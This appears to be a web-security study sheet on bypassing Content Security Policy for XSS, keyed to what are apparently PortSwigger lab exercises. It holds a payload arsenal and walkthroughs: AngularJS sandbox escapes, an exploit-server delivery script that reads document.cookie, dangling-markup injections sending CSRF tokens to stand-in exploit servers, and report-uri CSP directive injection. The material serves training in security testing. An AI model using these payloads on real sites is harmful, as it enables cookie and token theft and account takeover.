# XSS — CSP bypass (AngularJS sandbox, dangling markup, CSP injection)

Content Security Policy blocks inline script execution. Bypasses: AngularJS sandboxed template expressions execute outside CSP scope; a `report-uri` directive with user-controlled parameters allows injecting new CSP directives; dangling markup attacks steal page content (e.g., CSRF tokens) when XSS execution is blocked but HTML injection isn't.

## Quick reference
```
# AngularJS sandbox escape (no strings, no CSP)
toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

# AngularJS + CSP (ng-focus + $event, bypass via Angular event evaluation)
?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
# deliver: location='https://LAB/?search=...'  (force focus via #x)

# Dangling markup (steal CSRF token when script blocked)
<img src='https://EXPLOIT-SERVER?
# or:
<input name=email value=""><a href='https://COLLAB?

# CSP injection via report-uri token param
GET /?search=<img src=1 onerror=alert(1)>&token=;script-src-elem 'unsafe-inline'
```

## Root cause
- **AngularJS sandbox:** AngularJS evaluates `{{expressions}}` and `ng-*` directives using its own evaluator, which is not governed by CSP. Breaking out of the AngularJS "sandbox" (which restricts access to JS globals) gives access to the Function constructor and thus arbitrary code execution.
- **Dangling markup:** Even when CSP blocks script execution, HTML injection can leave an unclosed attribute that causes the browser to slurp following page content into an attacker-controlled URL (the page sends the CSRF token to the attacker's server as part of a link href or image src).
- **CSP injection:** If the CSP header is constructed using user input (e.g., `report-uri /csp?token=USER-INPUT`), injecting `;script-src-elem 'unsafe-inline'` adds a new directive that overrides the existing script-src restriction.

## Find it
- See CSP header on the response → note which directives are present.
- Is `report-uri` present with a URL that includes a user-controlled param? → CSP injection.
- Is the page running AngularJS (`ng-app` in HTML)? → sandbox escape.
- Is HTML injection possible but JS blocked by CSP? → dangling markup for data theft.
- Does any error/notification show reflected input inside a CSP policy string? → injection point.

## Technique
**AngularJS sandbox escape (no CSP):**
- The AngularJS sandbox prevents access to `window`, `Function`, etc.
- Bypass: `toString().constructor.prototype.charAt=[].join` — overwrites the charAt method used by the AngularJS sandbox check; the sandbox thinks it's iterating chars, but gets something else.
- Then: `[1]|orderBy:toString().constructor.fromCharCode(...)` — `toString().constructor` = `String` constructor; `.fromCharCode(120,61,97,108,101,114,116,40,49,41)` = `x=alert(1)`.
- Full: `toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`

**AngularJS + CSP (ng-focus + $event):**
- CSP blocks inline scripts; but AngularJS evaluates `ng-focus` directives via its own evaluator, which isn't restricted by CSP `script-src`.
- Payload: `?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x`
- `$event.composedPath()` returns an array; `|orderBy:'(z=alert)'` evaluates the expression with z=alert; `(document.cookie)` calls the function; the `#x` fragment auto-focuses the input on page load.
- Deliver via exploit server: `location='https://LAB/?search=<encoded-payload>#x'`

**Dangling markup (strict CSP, HTML injection):**
- CSP header: `default-src 'none'; script-src 'nonce-...'` — no inline JS.
- But HTML injection works. Inject: `<input name=email value=""><a href='https://EXPLOIT-SERVER?`
- This leaves an unclosed `href` attribute — the browser reads forward in the HTML looking for the closing `'`, slurping content including the CSRF token into the URL.
- Any link or image the victim clicks/loads will carry the CSRF token to the exploit server.
- Alternatively: manipulate the form's `action` attribute to point to your server.

**CSP injection via report-uri:**
- Response: `Content-Security-Policy: default-src 'self'; report-uri /csp-report?token=USER_CONTROLLED`
- Inject: `token=foo;script-src-elem 'unsafe-inline'`
- Resulting CSP: `...; report-uri /csp-report?token=foo;script-src-elem 'unsafe-inline'`
- The `;` starts a new directive; `script-src-elem 'unsafe-inline'` overrides default-src for inline scripts.
- Then deliver the reflected XSS payload normally → it now executes.
- Full URL: `https://LAB/?search=<img src=1 onerror=alert(1)>&token=;script-src-elem 'unsafe-inline'`

## Payload arsenal
```
# AngularJS sandbox (no CSP) — full payload
toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

# AngularJS + CSP — ng-focus payload
?search=<input%20id=x%20ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x

# Exploit server delivery (AngularJS + CSP)
<script>
location='https://LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>

# Dangling markup (steal CSRF token)
<input name=email value=""><a href='https://EXPLOIT-SERVER.exploit-server.net/exploit?

# CSP injection (report-uri token)
search=<img src=1 onerror=alert(1)>
token=;script-src-elem 'unsafe-inline'
# combined URL
https://LAB/?search=<img+src=1+onerror=alert(1)>&token=;script-src-elem+'unsafe-inline'
```

## Bypasses
| Defense | Bypass |
|---|---|
| CSP blocks inline scripts | AngularJS ng-* directives bypass CSP (evaluated by Angular, not browser) |
| AngularJS sandbox restricts globals | Overwrite `charAt` to break sandbox check; use `fromCharCode` to avoid strings |
| CSP + AngularJS sandbox | ng-focus + $event.composedPath() bypasses both |
| Strict CSP, JS fully blocked | Dangling markup — steal CSRF token without JS execution |
| CSP in header | report-uri with user-controlled token → inject new directives after `;` |

## Exploitation walkthrough
**AngularJS sandbox (no CSP):** `?search=toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1` → alert fires.

**AngularJS + CSP:** Exploit server: `location='https://LAB/?search=<input id=x ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x'` → deliver → victim auto-focuses input → ng-focus evaluates → alert with cookie.

**Dangling markup:** Inject `<input name=email value=""><a href='https://EXPLOIT-SERVER/log?data=` into reflected injection point. Send link to victim → victim's browser sends page content (incl. CSRF token) to exploit server as part of URL. Extract CSRF token from exploit server logs → forge email-change POST.

**CSP injection:** visit `https://LAB/?search=<img src=1 onerror=alert(1)>&token=;script-src-elem 'unsafe-inline'` → CSP directive injected → inline handler now allowed → alert.

## Chaining
- AngularJS XSS → [Exploiting-XSS](../Exploiting-XSS/) (steal document.cookie)
- Dangling markup → steal CSRF token → CSRF attack on email-change or password-reset
- CSP bypass → full XSS execution → any weaponization

## Tools
- **DevTools → Network → Response Headers** — read CSP directives
- **Burp Proxy** — observe report-uri parameter in CSP header
- **Exploit server** — host delivery scripts; receive dangling markup requests in logs

## Labs

### Reflected XSS with AngularJS sandbox escape without strings [Expert]
Overwrite `charAt` to break the AngularJS sandbox check; use `fromCharCode(120,61,97,108,101,114,116,40,49,41)` (= `x=alert(1)`) to avoid string literals. Key insight: the sandbox verifies access via charAt; corrupting charAt bypasses the check.

### Reflected XSS with AngularJS sandbox escape and CSP [Expert]
CSP blocks scripts; AngularJS still evaluates `ng-focus`. `$event.composedPath()|orderBy:'(z=alert)(document.cookie)'` executes via Angular's expression evaluator, bypassing CSP. Deliver via exploit server redirect + `#x` fragment for auto-focus. Key insight: Angular's expression evaluator is not subject to CSP `script-src`.

### Reflected XSS protected by very strict CSP, with dangling markup attack [Practitioner]
CSP fully blocks JS. HTML injection works. Inject unclosed href: `<input name=email value=""><a href='https://EXPLOIT-SERVER?` — slurps CSRF token from form. Use stolen token in POST /my-account/change-email. Key insight: dangling markup exfiltrates page content without any JS execution.

### Reflected XSS protected by CSP, with CSP bypass [Expert]
`report-uri` includes user-controlled `token` param. Inject `;script-src-elem 'unsafe-inline'` → CSP now allows inline scripts → `<img src=1 onerror=alert(1)>` executes. Key insight: injecting a CSP directive after `;` adds a new directive that overrides the existing default-src restriction for inline scripts.

## Real-world notes
- AngularJS sandbox escapes are critical because Angular-based SPAs often have strict CSP but Angular itself bypasses it.
- Dangling markup is under-utilized — many testers stop at "CSP blocks XSS" without realizing data theft is still possible.
- CSP `report-uri` injection is a subtle bug: the security control (CSP) is itself the injection point.
- Real-world CSP headers are complex; even a `nonce-based` CSP can be bypassed if one script tag reflects user input with the valid nonce.

## References
- https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- https://portswigger.net/web-security/cross-site-scripting/dangling-markup
